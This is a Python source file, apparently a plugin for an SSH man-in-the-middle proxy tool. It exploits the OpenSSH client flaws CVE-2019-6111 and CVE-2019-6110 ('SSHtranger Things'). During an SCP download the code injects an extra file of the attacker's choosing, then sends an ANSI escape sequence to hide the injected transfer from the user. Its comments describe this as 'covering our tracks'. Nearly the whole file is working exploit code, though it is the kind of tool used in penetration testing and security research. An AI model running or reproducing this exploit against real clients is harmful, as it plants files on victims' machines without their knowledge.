import logging
import os

from ssh_proxy_server.forwarders.scp import SCPForwarder


class SCPInjectFile(SCPForwarder):
    '''
    Injecting an additional file during SCP transmission

    This feature is based on a OpenSSH Client Vulnerability 'SSHtranger Things'
    that has been patched with version > OpenSSH 8.0p1

    Title:     SSHtranger Things
    Author:    Mark E. Haase <mhaase@hyperiongray.com>
    Homepage:  https://www.hyperiongray.com
    Date:      2019-01-17
    CVE:       CVE-2019-6111, CVE-2019-6110
    Advisory:  https://sintonen.fi/advisories/scp-client-multiple-vulnerabilities.txt
    '''

    @classmethod
    def parser_arguments(cls):
        cls.PARSER.add_argument(
            '--scp-inject',
            dest='scp_inject_file',
            required=True,
            help='file that is used for injection'
        )

    def __new__(cls, session):
        if session.scp_command.find(b'-f') != -1:
            return super(SCPInjectFile, cls).__new__(cls)
        else:
            logging.info("Client is not downloading a file, reverting to normal SCPForwarder")
            return SCPForwarder.__new__(cls)

    def __init__(self, session) -> None:
        super().__init__(session)
        self.args.scp_inject_file = os.path.expanduser(self.args.scp_inject_file)

        self.inject_file_stat = os.stat(self.args.scp_inject_file)
        self.file_to_inject = open(self.args.scp_inject_file, 'rb')

    def handle_traffic(self, traffic):
        response = super(SCPInjectFile, self).handle_traffic(traffic)
        self.sendall(self.session.scp_channel, response, self.session.scp_channel.send)

        def wait_ok():
            assert self.session.scp_channel.recv(1024) == b'\x00'

        def send_ok():
            self.session.scp_channel.sendall(b'\x00')

        wait_ok()

        # This is CVE-2019-6111: whatever file the client requested, we send
        # them 'exploit.txt' instead.
        logging.info('Injecting file %s to channel %d', self.args.scp_inject_file, self.session.scp_channel.get_id())
        command = "{}{} {} {}\n".format(
            self.file_command,
            self.inject_file_stat.st_mode,
            self.inject_file_stat.st_size,
            self.args.scp_inject_file
        )

        self.session.scp_channel.sendall(command)
        wait_ok()
        self.session.scp_channel.sendall(self.file_to_inject.read())
        self.file_to_inject.close()
        send_ok()
        wait_ok()

        # This is CVE-2019-6110: the client will display the text that we send
        # to stderr, even if it contains ANSI escape sequences. We can send
        # ANSI codes that clear the current line to hide the fact that a second
        # file was transmitted..
        logging.info('Covering our tracks by sending ANSI escape sequence')
        self.session.scp_channel.sendall_stderr("\x1b[1A".encode('ascii'))
